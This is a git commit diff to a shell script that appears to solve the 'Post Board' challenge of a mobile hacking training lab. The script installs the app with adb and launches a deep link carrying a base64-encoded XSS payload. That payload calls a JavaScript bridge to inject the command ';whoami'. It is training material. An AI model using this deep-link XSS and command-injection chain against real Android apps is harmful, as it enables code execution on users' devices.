75d84f23c4efe04e1ee9be672ccbf7c06ec3a564
mamatb <amatbaeza@proton.me>
2026-07-08 12:07:40 +0200

    minor style changes

--- Post Board/com.mobilehackinglab.postboard.sh
+++ Post Board/com.mobilehackinglab.postboard.sh
@@ -1,5 +1,5 @@
 adb install com.mobilehackinglab.postboard.apk
-PAYLOAD=$(base64 <<< '<img src=error onerror=WebAppInterface.postCowsayMessage(";whoami")>')
-adb shell "am start -a android.intent.action.VIEW -d postboard://postmessage/${PAYLOAD} -n com.mobilehackinglab.postboard/.MainActivity"
+PAYLOAD="$(base64 <<< '<img src=error onerror=WebAppInterface.postCowsayMessage(";whoami")>')"
+adb shell 'am start -a android.intent.action.VIEW -d postboard://postmessage/'"${PAYLOAD}"' -n com.mobilehackinglab.postboard/.MainActivity'
 adb shell 'am start -a android.intent.action.VIEW -d postboard://postmessage/ -n com.mobilehackinglab.postboard/.MainActivity'
 
